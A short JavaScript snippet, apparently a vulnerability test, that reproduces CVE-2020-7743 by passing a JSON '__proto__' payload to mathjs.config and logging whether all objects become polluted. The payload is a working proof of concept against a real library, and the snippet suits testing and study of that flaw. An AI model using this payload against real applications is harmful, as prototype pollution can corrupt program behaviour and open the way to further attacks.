// //https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7743
// test("prototype pollution in mathjs ", () => {
  var mathMod = require("mathjs");
  const mathjs = mathMod.create(mathMod.all);

console.log({}.polluted);

  const newConfig = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  mathjs.config(newConfig);

console.log({}.polluted);
// });
